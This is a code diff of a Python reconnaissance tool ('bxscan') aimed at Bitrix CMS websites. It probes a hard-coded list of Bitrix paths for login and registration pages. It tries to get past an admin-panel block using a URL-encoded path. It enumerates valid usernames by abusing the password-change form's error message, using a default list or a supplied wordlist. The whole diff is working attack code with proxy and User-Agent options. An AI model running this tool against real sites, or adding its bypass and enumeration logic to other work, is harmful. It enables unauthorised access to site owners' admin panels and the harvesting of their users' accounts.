@@ -3,71 +3,70 @@ import requests
 import time
 from colorama import Fore
 
-def fuzz_dirs(base_url, dirs):
+def fuzz_dirs(base_url, dirs, headers, proxy, fuzz_type):
     endpoints = []
     for dir in dirs:
         time.sleep(0.5)
         url = f"{base_url}/{dir}"
-        response = requests.get(url)
-        if response.status_code == 200:
+        response = send_request(url, headers, proxy)
+        if (fuzz_type == "login" and response.status_code == 200) or (fuzz_type == "register" and "Регистрация" in response.text):
             endpoints.append(url)
     return endpoints
 
-def fuzz_reg_dirs(base_url, dirs):
-    endpoints = []
-    for dir in dirs:
-        time.sleep(0.5)
-        url = f"{base_url}/{dir}"
-        response = requests.get(url)
-        if "Регистрация" in response.text:
-            endpoints.append(url)
-    return endpoints
+def send_request(url, headers, proxy):
+    return requests.get(url, headers=headers, proxies=proxy)
 
-def block_bypass(dirs):
-    dirs = list(map(lambda x: x.replace('bitrix', '%2e/%62%69%74%72%69%78'), dirs))
-    dirs = list(map(lambda x: x.replace('admin', '%2e/%61%64%6d%69%6e'), dirs))
-    return dirs
+def check_block(base_url, headers, proxy):
+    admin_url = f"{base_url}/bitrix/admin/"
+    detail_url = f"{base_url}/bitrix/tools/catalog_export/yandex_detail.php"
+    return send_request(detail_url, headers, proxy).status_code == 200 and send_request(admin_url, headers, proxy).status_code == 403
 
-def check_block(base_url):
-    if (requests.get(f"{base_url}/bitrix/tools/catalog_export/yandex_detail.php").status_code == 200) and (requests.get(f"{base_url}/bitrix/admin/").status_code == 403):
-        print(Fore.YELLOW + "[!] Admin panel block detected, trying to bypass...")
-        return True
-    else:
-        return False
-
-def enum_users(user_list, login_endpoints):
+def enum_users(user_list, login_endpoints, headers, proxy):
     valid_users = []
     login_endpoint = login_endpoints[0]
     for user in user_list:
         time.sleep(0.5)
         payload = {
-        'AUTH_FORM': 'Y',
-        'TYPE': 'CHANGE_PWD',
-        'USER_LOGIN': user,
-        'USER_CHECKWORD': '1'
+            'AUTH_FORM': 'Y',
+            'TYPE': 'CHANGE_PWD',
+            'USER_LOGIN': user,
+            'USER_CHECKWORD': '1'
         }
         url = f"{login_endpoint}?change_password=yes"
-        response = requests.post(url, data=payload)
+        response = requests.post(url, data=payload, headers=headers, proxies=proxy)
         if "Пароль должен  быть не менее 6 символов длиной." in response.text:
             valid_users.append(user)
-
     return valid_users
-
 
 def main():
     parser = argparse.ArgumentParser(description="Bitrix recon tool")
     parser.add_argument("-t", "--target", required=True, help="Base URL of the Bitrix website")
-    parser.add_argument("-p", "--proxy", required=False, help="Proxy server")
-    parser.add_argument("-u", "--user-agent", required=False, help="Use specific User-Agent")
+    parser.add_argument("-p", "--proxy", required=False, help="HTTP Proxy server (http://<IP>:<port>)")
+    parser.add_argument("-u", "--useragent", required=False, help="Use specific User-Agent")
+    parser.add_argument("-w", "--wordlist", required=False, help="Use custom username wordlist")
     args = parser.parse_args()
-    
-    base_url = args.target
-    user_list = ['test', 'admin', 'bitrix', 'testtest', 'root', 'guest', 'user', 'adm', 'administrator', 'demo']
-    
 
-    login_dirs = ['bitrix/tools/catalog_export/yandex_detail.php', 
-    "bitrix/admin/", 
-    "bitrix/tools/autosave.php", 
+    base_url = args.target
+    print(Fore.CYAN + "[*] Starting bxscan 0.1.0 against", base_url)
+
+    if args.useragent:
+        headers = {'User-Agent': args.useragent}
+        print(Fore.CYAN + "[*] Using", args.useragent, "as User-Agent")
+    else:
+        headers = {'User-Agent': 'bxscan/0.1.0'}
+        print(Fore.CYAN + "[*] Using default User-Agent")
+
+    if args.proxy:
+        proxy = {'http': args.proxy}
+        print(Fore.CYAN + "[*] Using HTTP proxy server", proxy)
+    else:
+        proxy = None
+
+    wordlist = args.wordlist
+
+    login_dirs = ["bitrix/admin/",
+    'bitrix/tools/catalog_export/yandex_detail.php',
+    "bitrix/tools/autosave.php",
     "bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php",
     "bitrix/components/bitrix/map.yandex.search/settings/settings.php",
     "bitrix/tools/upload.php",
@@ -85,24 +84,34 @@ def main():
     "bitrix/wizards/bitrix/demo/modules/examples/public/language/ru/examples/my-components/news_list.php",
     "bitrix/wizards/bitrix/demo/modules/subscribe/public/personal/subscribe/subscr_edit.php"]
 
+    blocked = check_block(base_url, headers, proxy)
+    if blocked:
+        print(Fore.YELLOW + "[!] Admin panel block detected, trying to bypass...")
+        bypass_dir = "%2e/%62%69%74%72%69%78/%2e/%61%64%6d%69%6e/"
+        if send_request(f"{base_url}/{bypass_dir}", headers, proxy).status_code == 200:
+            print(Fore.GREEN + "[+] Found admin panel endpoint (replace /bitrix/admin/ with URL Encode):")
+            print(f"{base_url}/{bypass_dir}")
+        else:
+            print(Fore.RED + "[-] Couldn't bypass admin panel restrictions.")
 
-    if check_block(base_url):
-        login_dirs += block_bypass(login_dirs)
-        blocked = True
 
-    login_endpoints = fuzz_dirs(base_url, login_dirs)
+    login_endpoints = fuzz_dirs(base_url, login_dirs, headers, proxy, "login")
     if login_endpoints:
         print(Fore.GREEN + "[+] Found Bitrix login endpoints:")
         for dir in login_endpoints:
             print(dir)
     else:
-        if blocked:
-            print(Fore.RED + "[-] Couldn't bypass admin panel block and no login endpoints found.")
-        else:
-            print(Fore.RED + "[-] No login endpoints found.")
-    
-    valid_users = enum_users(user_list, login_endpoints)
+        print(Fore.RED + "[-] No login endpoints found.")
 
+    user_list = ['test', 'admin', 'bitrix', 'testtest', 'root', 'guest', 'user', 'adm', 'administrator', 'demo']
+    if wordlist:
+        print(Fore.CYAN + "[*] Using username wordlist", wordlist)
+        with open(wordlist, 'r') as f:
+            user_list = [username.strip() for username in f.readlines()]
+    else:
+        print(Fore.CYAN + "[*] Using default username wordlist (Top10)")
+
+    valid_users = enum_users(user_list, login_endpoints, headers, proxy)
     if valid_users:
         print(Fore.GREEN + "[+] Usernames found:")
         for user in valid_users:
@@ -122,12 +131,13 @@ def main():
     "bitrix/modules/forum/install/admin/forum_index.php",
     "bitrix/wizards/bitrix/demo/public_files/ru/auth/index.php?register=yes"
     ]
-    register_endpoints = fuzz_reg_dirs(base_url, register_dirs)
+
+    register_endpoints = fuzz_dirs(base_url, register_dirs, headers, proxy, "register")
     if register_endpoints:
         print(Fore.GREEN + "[+] Found Bitrix registration endpoints:")
         for dir in register_endpoints:
             print(dir)
-    else: 
+    else:
         print(Fore.RED + "[-] No registration endpoints found.")
 
 if __name__ == "__main__":
